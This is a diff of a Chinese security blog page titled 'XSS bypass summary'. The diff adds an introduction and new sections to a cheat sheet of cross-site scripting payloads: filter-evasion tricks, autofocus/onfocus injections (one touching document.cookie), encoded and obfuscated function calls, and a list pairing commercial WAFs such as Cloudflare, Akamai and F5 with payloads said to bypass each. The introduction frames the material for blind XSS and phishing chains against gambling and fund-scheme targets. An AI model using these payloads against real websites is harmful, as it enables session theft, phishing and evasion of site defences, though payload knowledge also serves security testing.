@@ -100,15 +100,16 @@
 
 
 
-<meta name="description" content="一：正常构造方式：1、无过滤，直接写：&lt;script&gt;alert(1)&lt;&#x2F;script&gt; 2、正常截断： 12&quot;&gt; &lt;script&gt;alert(1)&lt;&#x2F;script&gt;&#39;&gt; &lt;script&gt;alert(1)&lt;&#x2F;script&gt;  3、不用&lt;&gt;尖括号： 1234&amp;quot">
+<meta name="description" content="0x01 前言乙方公司可能设计到资金盘目标，境外bc目标。在前后台数据交互中，很容易产生这种xss。往往后端的这种输出是没有过滤的。只要在前台的输入点上没有过滤的，后端基本上可以达到xss盲打的效果。以及xss去构造钓鱼攻击链。 xss常见编码： 1、html实体编码（十进制和十六进制） 2、url编码 window.open(“javascript:%61%6c%65%72%74%28%31%2">
 <meta property="og:type" content="article">
 <meta property="og:title" content="XSS绕过总结&#x2F;XSS命令总结">
 <meta property="og:url" content="https://virusday.github.io/2020/11/22/XSS%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/XSS%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/index.html">
 <meta property="og:site_name" content="v1rus blog">
-<meta property="og:description" content="一：正常构造方式：1、无过滤，直接写：&lt;script&gt;alert(1)&lt;&#x2F;script&gt; 2、正常截断： 12&quot;&gt; &lt;script&gt;alert(1)&lt;&#x2F;script&gt;&#39;&gt; &lt;script&gt;alert(1)&lt;&#x2F;script&gt;  3、不用&lt;&gt;尖括号： 1234&amp;quot">
+<meta property="og:description" content="0x01 前言乙方公司可能设计到资金盘目标，境外bc目标。在前后台数据交互中，很容易产生这种xss。往往后端的这种输出是没有过滤的。只要在前台的输入点上没有过滤的，后端基本上可以达到xss盲打的效果。以及xss去构造钓鱼攻击链。 xss常见编码： 1、html实体编码（十进制和十六进制） 2、url编码 window.open(“javascript:%61%6c%65%72%74%28%31%2">
 <meta property="og:image" content="https://virusday.github.io/2020/11/22/XSS%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/XSS%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/image-20201122135109290.png">
+<meta property="og:image" content="https://virusday.github.io/2020/11/22/XSS%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/XSS%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/image-20201207120531088.png">
 <meta property="article:published_time" content="2020-11-22T02:43:07.026Z">
-<meta property="article:modified_time" content="2020-11-22T07:41:46.537Z">
+<meta property="article:modified_time" content="2020-12-07T04:09:37.147Z">
 <meta property="article:author" content="Virusday">
 <meta property="article:tag" content="Learn">
 <meta name="twitter:card" content="summary">
@@ -335,8 +336,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2020-11-22T15:41:46+08:00">
-                2020-11-22
+              <time title="更新于" itemprop="dateModified" datetime="2020-12-07T12:09:37+08:00">
+                2020-12-07
               </time>
             
           </span>
@@ -363,7 +364,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  1.6k
+                  1.9k
                 </span>
               
 
@@ -379,7 +380,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  8
+                  9
                 </span>
               
             </div>
@@ -400,7 +401,12 @@
       
 
       
-        <h3 id="一：正常构造方式："><a href="#一：正常构造方式：" class="headerlink" title="一：正常构造方式："></a>一：正常构造方式：</h3><p>1、无过滤，直接写：<br><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+        <h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>乙方公司可能设计到资金盘目标，境外bc目标。在前后台数据交互中，很容易产生这种xss。往往后端的这种输出是没有过滤的。只要在前台的输入点上没有过滤的，后端基本上可以达到xss盲打的效果。以及xss去构造钓鱼攻击链。</p>
+<p>xss常见编码：</p>
+<p>1、html实体编码（十进制和十六进制）</p>
+<p>2、url编码 window.open(“javascript:%61%6c%65%72%74%28%31%29”)chrome阻止弹出网页窗口</p>
+<p>3、base64编码</p>
+<h3 id="0x02-正题"><a href="#0x02-正题" class="headerlink" title="0x02 正题"></a>0x02 正题</h3><h3 id="一：正常构造方式："><a href="#一：正常构造方式：" class="headerlink" title="一：正常构造方式："></a>一：正常构造方式：</h3><p>1、无过滤，直接写：<br><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
 <p>2、正常截断：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br><span class="line">&#39;&gt; &lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
 
@@ -472,7 +478,16 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img&#x2F; \&#x2F;\μ src&#x3D;x onerror&#x3D;alert(1)&#x2F;&#x2F;&gt;</span><br><span class="line">&lt;img src&#x3D;\x17\x17 onerror&#x3D;alert(1)&#x2F;&#x2F;&gt;</span><br><span class="line">&lt;img&#x2F;\%20src&#x3D;%17y%17 onerror&#x3D;%C2%A0alert(1)&#x2F;&#x2F;&gt;</span><br></pre></td></tr></table></figure>
 
 <p>9、过滤括号和分号<br>你可以使用花括号来进行语句隔离，将onerror整体放入花括号中。这样就避免了使用分号：<br><code>&lt;script&gt;{onerror=alert}throw 1337&lt;/script&gt;</code></p>
-<h3 id="三：常见的waf-bypass"><a href="#三：常见的waf-bypass" class="headerlink" title="三：常见的waf bypass"></a>三：常见的waf bypass</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">CopyWAF名称：Cloudflare</span><br><span class="line">Payload：&lt;a”&#x2F;onclick&#x3D;(confirm)()&gt;click</span><br><span class="line">绕过技术：非空格填充</span><br><span class="line"></span><br><span class="line">WAF名称：Wordfence</span><br><span class="line">Payload：&lt;a&#x2F;href&#x3D;javascript&amp;colon;alert()&gt;click</span><br><span class="line">绕过技术：数字字符编码</span><br><span class="line"></span><br><span class="line">WAF名称：Barracuda</span><br><span class="line">Payload：&lt;a&#x2F;href&#x3D;&amp;#74;ava%0a%0d%09script&amp;colon;alert()&gt;click</span><br><span class="line">绕过技术：数字字符编码</span><br><span class="line"></span><br><span class="line">WAF名称：Akamai</span><br><span class="line">Payload：&lt;d3v&#x2F;onauxclick&#x3D;[2].some(confirm)&gt;click</span><br><span class="line">绕过技术：黑名单中缺少事件处理器以及函数调用混淆</span><br><span class="line"></span><br><span class="line">WAF名称：Comodo</span><br><span class="line">Payload：&lt;d3v&#x2F;onauxclick&#x3D;(((confirm)))“&gt;click</span><br><span class="line">绕过技术：黑名单中缺少事件处理器以及函数调用混淆</span><br><span class="line"></span><br><span class="line">WAF名称：F5</span><br><span class="line">Payload：&lt;d3v&#x2F;onmouseleave&#x3D;[2].some(confirm)&gt;click</span><br><span class="line">绕过技术：黑名单中缺少事件处理器以及函数调用混淆</span><br><span class="line"></span><br><span class="line">WAF名称：ModSecurity</span><br><span class="line">Payload：&lt;details&#x2F;open&#x2F;ontoggle&#x3D;alert()&gt;</span><br><span class="line">绕过技术：黑名单中缺少标签或事件处理器</span><br><span class="line"></span><br><span class="line">WAF名称：dotdefender</span><br><span class="line">Payload：&lt;details&#x2F;open&#x2F;ontoggle&#x3D;(confirm)()&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+<h3 id="三、-非常规html构造xsspayload"><a href="#三、-非常规html构造xsspayload" class="headerlink" title="三、 非常规html构造xsspayload"></a>三、 非常规html构造xsspayload</h3><p>1、’tabindex’或者’contenteditable,任何html元素都可以通过’tabindex’或’contenteditable’进行聚焦；</p>
+<p>2、‘contenteditable’是一个枚举属性，表示元素是否可以被用户编辑。如果可以，浏览器会修改元素的部件以允许编辑。这两个都导致onfocus事件自动触发</p>
+<p>3、user-modify，该属性在chrome下适用</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">wafbypass</span> <span class="attr">tabindex</span>=<span class="string">"1"</span> <span class="attr">onfocus</span>=<span class="string">"alert(1)"</span> <span class="attr">autofocus</span>&gt;</span><span class="tag">&lt;/<span class="name">wafbypass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">wafbypass2</span> <span class="attr">onfocus</span>=<span class="string">"alert(123)"</span> <span class="attr">autofocus</span> <span class="attr">contenteditable</span>=&gt;</span><span class="tag">&lt;/<span class="name">wafbypass2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">wafbypass3</span> <span class="attr">style</span>=<span class="string">"-webkit-user-modify: read-write"</span> <span class="attr">onfocus</span>=<span class="string">"alert(document.cookie)"</span> <span class="attr">autofocus</span>&gt;</span><span class="tag">&lt;/<span class="name">wafbypass3</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>on标签也可以做一些手脚 比如onblur</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xxx</span>/<span class="attr">tabindex</span>=<span class="string">1%20onblur</span>=<span class="string">alert</span>`<span class="attr">1</span>`%<span class="attr">20autofocus</span>&gt;</span></span><br><span class="line">self["alert"](1)</span><br><span class="line">self["\x61\x6c\x65\x72\x74"](1)</span><br><span class="line">(2).some(alert)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/22/XSS%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/XSS%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/image-20201207120531088.png" alt="image-20201207120531088"></p>
+<h3 id="四：常见的waf-bypass"><a href="#四：常见的waf-bypass" class="headerlink" title="四：常见的waf bypass"></a>四：常见的waf bypass</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">CopyWAF名称：Cloudflare</span><br><span class="line">Payload：&lt;a”&#x2F;onclick&#x3D;(confirm)()&gt;click</span><br><span class="line">绕过技术：非空格填充</span><br><span class="line"></span><br><span class="line">WAF名称：Wordfence</span><br><span class="line">Payload：&lt;a&#x2F;href&#x3D;javascript&amp;colon;alert()&gt;click</span><br><span class="line">绕过技术：数字字符编码</span><br><span class="line"></span><br><span class="line">WAF名称：Barracuda</span><br><span class="line">Payload：&lt;a&#x2F;href&#x3D;&amp;#74;ava%0a%0d%09script&amp;colon;alert()&gt;click</span><br><span class="line">绕过技术：数字字符编码</span><br><span class="line"></span><br><span class="line">WAF名称：Akamai</span><br><span class="line">Payload：&lt;d3v&#x2F;onauxclick&#x3D;[2].some(confirm)&gt;click</span><br><span class="line">绕过技术：黑名单中缺少事件处理器以及函数调用混淆</span><br><span class="line"></span><br><span class="line">WAF名称：Comodo</span><br><span class="line">Payload：&lt;d3v&#x2F;onauxclick&#x3D;(((confirm)))“&gt;click</span><br><span class="line">绕过技术：黑名单中缺少事件处理器以及函数调用混淆</span><br><span class="line"></span><br><span class="line">WAF名称：F5</span><br><span class="line">Payload：&lt;d3v&#x2F;onmouseleave&#x3D;[2].some(confirm)&gt;click</span><br><span class="line">绕过技术：黑名单中缺少事件处理器以及函数调用混淆</span><br><span class="line"></span><br><span class="line">WAF名称：ModSecurity</span><br><span class="line">Payload：&lt;details&#x2F;open&#x2F;ontoggle&#x3D;alert()&gt;</span><br><span class="line">绕过技术：黑名单中缺少标签或事件处理器</span><br><span class="line"></span><br><span class="line">WAF名称：dotdefender</span><br><span class="line">Payload：&lt;details&#x2F;open&#x2F;ontoggle&#x3D;(confirm)()&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
       
     </div>
     
@@ -589,7 +604,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">42</span>
+                  <span class="site-state-item-count">44</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -633,6 +648,14 @@
                 
                 
                   <li class="recent_posts_li">
+                    <a href="/2020/12/08/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/" title="jsp一句话木马/jsp一句话木马" target="_blank">jsp一句话木马/jsp一句话木马</a>
+                  </li>
+                
+                  <li class="recent_posts_li">
+                    <a href="/2020/12/05/waf%20bypass/waf%20bypass%E6%8A%80%E5%B7%A7/" title="waf bypass/waf bypass技巧" target="_blank">waf bypass/waf bypass技巧</a>
+                  </li>
+                
+                  <li class="recent_posts_li">
                     <a href="/2020/12/04/XSS%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/XSS%E6%B7%B1%E5%85%A5/" title="XSS绕过总结/XSS深入" target="_blank">XSS绕过总结/XSS深入</a>
                   </li>
                 
@@ -642,14 +665,6 @@
                 
                   <li class="recent_posts_li">
                     <a href="/2020/11/30/JAVA%20JNDI%E6%B3%A8%E5%85%A5/JAVA%20JNDI%E6%B3%A8%E5%85%A5/" title="JAVA JNDI注入/JAVA JNDI注入" target="_blank">JAVA JNDI注入/JAVA JNDI注入</a>
-                  </li>
-                
-                  <li class="recent_posts_li">
-                    <a href="/2020/11/30/JAVA%20RMI%E7%9A%84%E4%BD%BF%E7%94%A8/JAVA%20RMI%E7%9A%84%E4%BD%BF%E7%94%A8/" title="JAVA RMI的使用/JAVA RMI的使用" target="_blank">JAVA RMI的使用/JAVA RMI的使用</a>
-                  </li>
-                
-                  <li class="recent_posts_li">
-                    <a href="/2020/11/27/http%E7%BC%96%E7%A0%81%E7%BB%95waf/%E7%BC%96%E7%A0%81%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93%E7%BB%95waf/" title="http编码绕waf/编码分块传输绕waf" target="_blank">http编码绕waf/编码分块传输绕waf</a>
                   </li>
                 
               </ul>
@@ -677,7 +692,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#一：正常构造方式："><span class="nav-number">1.</span> <span class="nav-text">一：正常构造方式：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二：绕过方式"><span class="nav-number">2.</span> <span class="nav-text">二：绕过方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#三：常见的waf-bypass"><span class="nav-number">3.</span> <span class="nav-text">三：常见的waf bypass</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-前言"><span class="nav-number">1.</span> <span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-正题"><span class="nav-number">2.</span> <span class="nav-text">0x02 正题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#一：正常构造方式："><span class="nav-number">3.</span> <span class="nav-text">一：正常构造方式：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二：绕过方式"><span class="nav-number">4.</span> <span class="nav-text">二：绕过方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#三、-非常规html构造xsspayload"><span class="nav-number">5.</span> <span class="nav-text">三、 非常规html构造xsspayload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#四：常见的waf-bypass"><span class="nav-number">6.</span> <span class="nav-text">四：常见的waf bypass</span></a></li></ol></div>
             
 
           </div>
@@ -719,7 +734,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">45k</span>
+    <span title="Site words total count">50k</span>
   
 </div>
 -->
